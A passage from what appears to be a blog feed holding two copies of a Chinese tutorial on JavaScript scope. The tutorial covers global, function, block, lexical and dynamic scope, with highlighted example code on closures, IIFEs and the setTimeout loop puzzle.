class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">value</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      result = value + <span class="number">1</span>; <span class="comment">// 没有用 var 修饰</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> result;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    foo(<span class="number">123</span>);<span class="comment">// 124</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.result);<span class="comment">// 124 &lt;=  挂在了 window全局对象上 </span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>现在，变量 <code>result</code> 被挂载到 <code>window</code> 对象上了！！！</p><h3 id="函数作用域："><a href="#函数作用域：" class="headerlink" title="函数作用域："></a>函数作用域：</h3><p>函数作用域内，对外是封闭的，从外层的作用域无法直接访问函数内部的作用域！！！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(testValue);<span class="comment">// 报错：ReferenceError: testValue is not defined</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h5 id="通过-return-访问函数内部变量："><a href="#通过-return-访问函数内部变量：" class="headerlink" title="通过 return 访问函数内部变量："></a>通过 return 访问函数内部变量：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> testValue + value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(bar(<span class="string">'fun'</span>));<span class="comment">// "innerfun"</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>函数就像一个工厂，我们输入一些东西，它在内部加工，然后给我们一个加工产物；</p><h5 id="通过-闭包-访问函数内部变量："><a href="#通过-闭包-访问函数内部变量：" class="headerlink" title="通过 闭包 访问函数内部变量："></a>通过 闭包 访问函数内部变量：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> rusult = testValue + value;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">innser</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> rusult;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> innser();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(bar(<span class="string">'fun'</span>));<span class="comment">// "innerfun"</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>关于闭包，我不会在这篇文章过多描述，因为，想要描述闭包，本身需要跟本文章一样的长度；</p><h5 id="立即执行函数："><a href="#立即执行函数：" class="headerlink" title="立即执行函数："></a>立即执行函数：</h5><p>这是个很实用的函数，很多库都用它分离全局作用域，形成一个单独的函数作用域；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> testValue = <span class="number">123</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> testFunc = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'just test'</span>); &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    &#125;)();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testValue);<span class="comment">// undefined</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testFunc);<span class="comment">// undefined</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>它能够自动执行 <code>(function() { //... })()</code> 里面包裹的内容，能够很好地消除全局变量的影响；</p><h3 id="块级作用域："><a href="#块级作用域：" class="headerlink" title="块级作用域："></a>块级作用域：</h3><p>在 ES6 之前，是没有块级作用域的概念的。如果你有 C++ 或者 Java 经验，想必你对块级作用域并不陌生；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i)<span class="comment">// 5</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>很明显，用 var 关键字声明的变量，在 <code>for</code> 循环之后仍然被保存这个作用域里；</p><p>这可以说明： <code>for() { }</code>仍然在，全局作用域里，并没有产生像函数作用域一样的封闭效果；</p><p>如果想要实现 <strong>块级作用域</strong> 那么我们需要用 <code>let</code> 关键字声明！！！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i)<span class="comment">// 报错：ReferenceError: i is not defined</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>在 for 循环执行完毕之后 i 变量就被释放了，它已经消失了！！！</strong></p><p>同样能形成块级作用域的还有 <code>const</code> 关键字：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="string">'inner'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// 报错：ReferenceError: a is not defined</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><code>let</code> 和 <code>const</code> 关键字，创建块级作用域的条件是必须有一个 <code>{ }</code> 包裹：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="string">'inner'</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">   <span class="keyword">let</span> b = <span class="string">'inner'</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>不要小看块级作用域，它能帮你做很多事情，举个栗子：</p><p>举一个面试中常见的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(i);<span class="comment">// 5 5 5 5 5</span></span><br><span class="line">  &#125;, <span class="number">200</span>);</span><br><span class="line">&#125;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这几乎是作用域的必考题目，你会觉得这种结果很奇怪，但是事实就是这么发生了；</p><p>这里的 i 是在全局作用域里面的，只存在 1 个值，等到回调函数执行时，用词法作用域捕获的 i 就只能是 5；</p><p>因为这个循环计算的 i 值在回调函数结束之前就已经执行到 5 了；我们应该如何让它恢复正常呢？？？</p><p><strong>解法1：调用函数，创建函数作用域：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  abc(i);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abc</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(i);<span class="comment">// 0 1 2 3 4 </span></span><br><span class="line">  &#125;, <span class="number">200</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>这里相当于创建了5个函数作用域来保存，我们的 i 值；</p><p><strong>解法2：采用立即执行函数，创建函数作用域；</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">j</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(j);</span><br><span class="line">    &#125;, <span class="number">200</span>);</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>原理同上，只不过换成了自动执行这个函数罢了，这里保存了 5 次 i 的值；</p><p><strong>解法3：let  创建块级作用域</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;, <span class="number">200</span>);</span><br><span class="line">&#125;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="词法作用域："><a href="#词法作用域：" class="headerlink" title="词法作用域："></a>词法作用域：</h3><p>词法作用域是指一个变量的可见性，及其文本表述的模拟值（《JavaScript函数式编程》）;</p><p>听起来，十分地晦涩，不过将代码拿来分析就非常浅显易懂了；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">testValue = <span class="string">'outer'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">afun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'middle'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">console</span>.log(testValue);<span class="comment">// "middle"</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">innerFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">console</span>.log(testValue);<span class="comment">// "inner"</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> innerFun();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">afun();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(testValue);<span class="comment">// "outer"</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>当我们要使用声明的变量时：JS引擎总会从最近的一个域，向外层域查找；</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce92a304bc47?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>再举一个一个实际的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testValue = <span class="string">'outer'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(testValue);<span class="comment">// "outer"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">  </span><br><span class="line">  foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>显然，当 JS 引擎查找这个变量时，发现全局的 testValue 离得更近一些，这恰好和 动态作用域 相反；</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce99fad0f0ea?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>如上图所示，下面将讲述与 词法作用域相反的动态作用域；</p><h3 id="动态作用域："><a href="#动态作用域：" class="headerlink" title="动态作用域："></a>动态作用域：</h3><p>在编程中，最容易被低估和滥用的概念就是动态作用域（《JavaScript函数式编程》）。</p><p>在 JavaScript 中的仅存的应用动态作用域的地方：<code>this</code> 引用，所以这是一个大坑！！！！！</p><blockquote><p>动态作用域，作用域是基于调用栈的，而不是代码中的作用域嵌套；</p><p>作用域嵌套，有词法作用域一样的特性，查找变量时，总是寻找最近的作用域；</p></blockquote><p>同样是，词法作用域，例子2，同一份代码，<strong>如果</strong> 是动态作用域：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testValue = <span class="string">'outer'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(testValue);<span class="comment">// "inner"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">  </span><br><span class="line">  foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>当然，JavaScript 除了this之外，其他，都是根据词法作用域查找！！！</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/3/28/1626ce78d69108cb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>为什么要理解动态作用域呢？因为，这能让你更好地学习 <code>this</code> 引用！！！</p><p> 要清楚，JavaScript 实际上没有动态作用域。它拥有词法作用域。就这么简单。但是 <code>this</code> 机制有些像动态作用域。</p><p>关键的差异：词法作用域是编写时的，而动态作用域（和 <code>this</code>）是运行时的。词法作用域关心的是 <em>函数在何处被声明</em>，但是动态作用域关心的是函数 <em>从何处</em> 被调用。</p><p>作者：leiting1998<br>链接：<a href="https://juejin.im/post/5abb99e9f265da2392366824" target="_blank" rel="noopener">https://juejin.im/post/5abb99e9f265da2392366824</a><br>来源：掘金</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈 JavaScript 的作用域</title>
      <link href="2018/11/01/%E8%B0%88%E8%B0%88-JavaScript-%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
      <url>2018/11/01/%E8%B0%88%E8%B0%88-JavaScript-%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="全局作用域："><a href="#全局作用域：" class="headerlink" title="全局作用域："></a>全局作用域：</h3><p>作用域，是指变量的生命周期（一个变量在哪些范围内保持一定值）。</p><blockquote><p>全局变量：</p><p>生命周期将存在于整个程序之内。</p><p>能被程序中任何函数或者方法访问。</p><p>在 JavaScript 内默认是可以被修改的。</p></blockquote><p>全局变量，虽然好用，但是是非常可怕的，这是所有程序员公认的事实。</p><a id="more"></a><h5 id="显式声明："><a href="#显式声明：" class="headerlink" title="显式声明："></a>显式声明：</h5><p>带有关键字 var 的声明；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> testValue = <span class="number">123</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> testFunc = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'just test'</span>) &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">/**---------全局变量会挂载到 window 对象上------------**/</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testFunc)<span class="comment">// ƒ () &#123; console.log('just test') &#125;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testValue)<span class="comment">// 123</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>其实，我们写的函数如果不经过封装，也会是全局变量，他的生命周期也就是全局作用域；</strong></p><h5 id="隐式声明："><a href="#隐式声明：" class="headerlink" title="隐式声明："></a>隐式声明：</h5><p>不带有<strong>声明关键字</strong>的变量，JS 会默认帮你声明一个全局变量！！！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">value</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      result = value + <span class="number">1</span>; <span class="comment">// 没有用 var 修饰</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> result;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    foo(<span class="number">123</span>);<span class="comment">// 124</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.result);<span class="comment">// 124 &lt;=  挂在了 window全局对象上 </span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>现在，变量 <code>result</code> 被挂载到 <code>window</code> 对象上了！！！</p><h3 id="函数作用域："><a href="#函数作用域：" class="headerlink" title="函数作用域："></a>函数作用域：</h3><p>函数作用域内，对外是封闭的，从外层的作用域无法直接访问函数内部的作用域！！！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(testValue);<span class="comment">// 报错：ReferenceError: testValue is not defined</span></span><br></pre></td></tr></table></figure><h5 id="通过-return-访问函数内部变量："><a href="#通过-return-访问函数内部变量：" class="headerlink" title="通过 return 访问函数内部变量："></a>通过 return 访问函数内部变量：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> testValue + value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(bar(<span class="string">'fun'</span>));<span class="comment">// "innerfun"</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>函数就像一个工厂，我们输入一些东西，它在内部加工，然后给我们一个加工产物；</p><h5 id="通过-闭包-访问函数内部变量："><a href="#通过-闭包-访问函数内部变量：" class="headerlink" title="通过 闭包 访问函数内部变量："></a>通过 闭包 访问函数内部变量：</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testValue = <span class="string">'inner'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> rusult = testValue + value;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">innser</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> rusult;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> innser();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(bar(<span class="string">'fun'</span>));<span class="comment">// "innerfun"</span></span><br></pre></td></tr></table></figure><p>关于闭包，我不会在这篇文章过多描述，因为，想要描述闭包，本身需要跟本文章一样的长度；</p><h5 id="立即执行函数："><a href="#立即执行函数：" class="headerlink" title="立即执行函数："></a>立即执行函数：</h5><p>这是个很实用的函数，很多库都用它分离全局作用域，形成一个单独的函数作用域；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> testValue = <span class="number">123</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> testFunc = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'just test'</span>); &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    &#125;)();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testValue);<span class="comment">// undefined</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testFunc);<span class="comment">// undefined</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>它能够自动执行 